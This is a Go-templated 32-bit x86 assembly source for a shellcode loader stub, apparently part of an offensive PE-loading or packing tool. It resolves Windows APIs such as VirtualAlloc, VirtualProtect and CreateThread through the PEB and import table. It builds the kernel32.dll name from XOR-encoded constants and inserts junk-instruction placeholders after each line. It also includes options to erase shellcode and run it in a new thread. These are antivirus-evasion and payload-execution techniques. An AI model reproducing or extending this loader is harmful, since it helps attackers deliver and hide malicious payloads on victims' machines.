.code32

// edi store address of ImageBaseAddress
// esi store address of kernel32.dll
// ebx store address of LoadLibrary
// ebp store address of GetProcAddress
// [esp+0x04] store address of allocated memory page
// [esp+0x08] store address of VirtualAlloc
// [esp+0x0C] store address of VirtualFree
// [esp+0x10] store address of VirtualProtect
// [esp+0x14] store address of CreateThread
// [esp+0x18] store address of WaitForSingleObject

entry:
// ================================ prepare environment ================================

  // ensure stack is 16 bytes aligned
  push ebp                                                     {{igi}}
  mov ebp, esp                                                 {{igi}}
  and esp, 0xFFFFFFF0                                          {{igi}}
  push ebp                                                     {{igi}}

  // reserve stack for store variables
  sub esp, 0x2C                                                {{igi}}

// =============================== get procedure address ===============================

{{if .LackProcedure}}
  // push kernel32 module name to stack
  mov {{.Reg.eax}}, {{index .Kernel32DLLDB  0}}                {{igi}}
  mov {{.Reg.ecx}}, {{index .Kernel32DLLKey 0}}                {{igi}}
  xor {{.Reg.eax}}, {{.Reg.ecx}}                               {{igi}}
  push {{.Reg.eax}}                                            {{igi}}
  mov {{.Reg.ebx}}, {{index .Kernel32DLLDB  1}}                {{igi}}
  mov {{.Reg.edx}}, {{index .Kernel32DLLKey 1}}                {{igi}}
  xor {{.Reg.ebx}}, {{.Reg.edx}}                               {{igi}}
  push {{.Reg.ebx}}                                            {{igi}}
  mov {{.Reg.edx}}, {{index .Kernel32DLLDB  2}}                {{igi}}
  mov {{.Reg.ebp}}, {{index .Kernel32DLLKey 2}}                {{igi}}
  xor {{.Reg.edx}}, {{.Reg.ebp}}                               {{igi}}
  push {{.Reg.edx}}                                            {{igi}}
  mov {{.Reg.edi}}, {{index .Kernel32DLLDB  3}}                {{igi}}
  mov {{.Reg.esi}}, {{index .Kernel32DLLKey 3}}                {{igi}}
  xor {{.Reg.edi}}, {{.Reg.esi}}                               {{igi}}
  push {{.Reg.edi}}                                            {{igi}}

  {{if .LoadLibraryWOnly}}
    mov {{.Reg.ebx}}, {{index .Kernel32DLLDB  4}}              {{igi}}
    mov {{.Reg.edx}}, {{index .Kernel32DLLKey 4}}              {{igi}}
    xor {{.Reg.ebx}}, {{.Reg.edx}}                             {{igi}}
    push {{.Reg.ebx}}                                          {{igi}}
    mov {{.Reg.edi}}, {{index .Kernel32DLLDB  5}}              {{igi}}
    mov {{.Reg.esi}}, {{index .Kernel32DLLKey 5}}              {{igi}}
    xor {{.Reg.edi}}, {{.Reg.esi}}                             {{igi}}
    push {{.Reg.edi}}                                          {{igi}}
    mov {{.Reg.eax}}, {{index .Kernel32DLLDB  6}}              {{igi}}
    mov {{.Reg.ecx}}, {{index .Kernel32DLLKey 6}}              {{igi}}
    xor {{.Reg.eax}}, {{.Reg.ecx}}                             {{igi}}
    push {{.Reg.eax}}                                          {{igi}}
  {{end}}

  // get pointer to the PEB
  xor {{.Reg.eax}}, {{.Reg.eax}}                               {{igi}}
  mov {{.Reg.eax}}, 0x30                                       {{igi}}
  mov {{.Reg.ebx}}, fs:[{{.Reg.eax}}]                          {{igi}}
  // store image base address
  mov {{.RegN.edi}}, [{{.Reg.ebx}} + 0x08]                     {{igi}}

  // read the LoadLibraryA/W form IAT
  mov {{.RegN.ebx}}, {{.RegN.edi}}                             {{igi}}
  add {{.RegN.ebx}}, {{hex .LoadLibrary}}                      {{igi}}
  mov {{.RegN.ebx}}, [{{.RegN.ebx}}]                           {{igi}}

  // load kernel32.dll
  push esp             {{igi}} // lpLibFileName
  call {{.RegN.ebx}}   {{igi}} // call LoadLibraryA/W

  // store the handle of kernel32.dll
  mov {{.RegN.esi}}, eax                                       {{igi}}

  // restore stack for kernel32 module name
  {{if .LoadLibraryWOnly}}
    add esp, 7*4                                               {{igi}}
  {{else}}
    add esp, 4*4                                               {{igi}}
  {{end}}




{{else}}
  // get pointer to the PEB
  xor {{.Reg.eax}}, {{.Reg.eax}}                               {{igi}}
  mov {{.Reg.eax}}, 0x30                                       {{igi}}
  mov {{.Reg.ebx}}, fs:[{{.Reg.eax}}]                          {{igi}}
  // store image base address
  mov {{.RegN.edi}}, [{{.Reg.ebx}} + 0x08]                     {{igi}}
  // get procedure address of VirtualAlloc
  mov {{.RegV.eax}}, {{.RegN.edi}}                             {{igi}}
  add {{.RegV.eax}}, {{hex .VirtualAlloc}}                     {{igi}}
  mov {{.RegV.eax}}, [{{.RegV.eax}}]                           {{igi}}
  mov [esp+0x08], {{.RegV.eax}}                                {{igi}}
  // get procedure address of VirtualFree
  {{if .NeedEraseShellcode}}
    mov {{.RegV.ecx}}, {{.RegN.edi}}                           {{igi}}
    add {{.RegV.ecx}}, {{hex .VirtualFree}}                    {{igi}}
    mov {{.RegV.ecx}}, [{{.RegV.ecx}}]                         {{igi}}
    mov [esp+0x0C], {{.RegV.ecx}}                              {{igi}}
  {{end}}
  // get procedure address of VirtualProtect
  mov {{.RegV.edx}}, {{.RegN.edi}}                             {{igi}}
  add {{.RegV.edx}}, {{hex .VirtualProtect}}                   {{igi}}
  mov {{.RegV.edx}}, [{{.RegV.edx}}]                           {{igi}}
  mov [esp+0x10], {{.RegV.edx}}                                {{igi}}
  // get procedure address of CreateThread
  {{if .NeedCreateThread}}
    mov {{.RegV.eax}}, {{.RegN.edi}}                           {{igi}}
    add {{.RegV.eax}}, {{hex .CreateThread}}                   {{igi}}
    mov {{.RegV.eax}}, [{{.RegV.eax}}]                         {{igi}}
    mov [esp+0x14], {{.RegV.eax}}                              {{igi}}
  {{end}}
  // get procedure address of WaitForSingleObject
  {{if .NeedWaitThread}}
    mov {{.RegV.ecx}}, {{.RegN.edi}}                           {{igi}}
    add {{.RegV.ecx}}, {{hex .WaitForSingleObject}}            {{igi}}
    mov {{.RegV.ecx}}, [{{.RegV.ecx}}]                         {{igi}}
    mov [esp+0x18], {{.RegV.ecx}}                              {{igi}}
  {{end}}
{{end}} // LackProcedure

// ================================== clean environment ==================================

  // restore stack for store variables
  add esp, 0x2C

  // restore stack and ebp
  pop ebp                                                      {{igi}}
  mov esp, ebp                                                 {{igi}}
  pop ebp                                                      {{igi}}

  // mark the end of loader
  {{db .EndOfLoader}}

// ====================================== function =======================================

xor_shift:
  push {{.RegV.ecx}}                                           {{igi}}
  mov {{.RegV.ecx}}, {{.RegV.eax}}                             {{igi}}
  shl {{.RegV.ecx}}, 13                                        {{igi}}
  xor {{.RegV.eax}}, {{.RegV.ecx}}                             {{igi}}
  mov {{.RegV.ecx}}, {{.RegV.eax}}                             {{igi}}
  shr {{.RegV.ecx}}, 17                                        {{igi}}
  xor {{.RegV.eax}}, {{.RegV.ecx}}                             {{igi}}
  mov {{.RegV.ecx}}, {{.RegV.eax}}                             {{igi}}
  shl {{.RegV.ecx}}, 5                                         {{igi}}
  xor {{.RegV.eax}}, {{.RegV.ecx}}                             {{igi}}
  pop {{.RegV.ecx}}                                            {{igi}}
  ret                                                          {{igi}}
